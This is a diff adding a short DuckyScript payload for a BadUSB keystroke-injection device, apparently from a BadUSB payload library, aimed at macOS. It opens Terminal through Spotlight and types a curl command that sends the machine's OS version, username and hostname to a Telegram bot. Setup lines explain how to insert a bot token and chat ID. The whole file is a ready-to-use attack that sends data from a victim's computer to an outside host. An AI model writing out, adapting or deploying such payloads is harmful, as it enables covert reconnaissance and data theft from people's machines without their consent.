@@ -1,0 +1,22 @@
+REM Title: macOS System Info to Telegram
+REM Author: BadUSB Library
+REM Description: Sends system info to Telegram
+REM Target: macOS 10.15+
+REM Category: Discovery
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Send system info
+STRING curl -s -X POST "https://api.telegram.org/botTELEGRAM_BOT_TOKEN/sendMessage" -d chat_id="TELEGRAM_CHAT_ID" -d text="System: $(sw_vers -productName) $(sw_vers -productVersion), User: $(whoami), Host: $(hostname)"
+ENTER
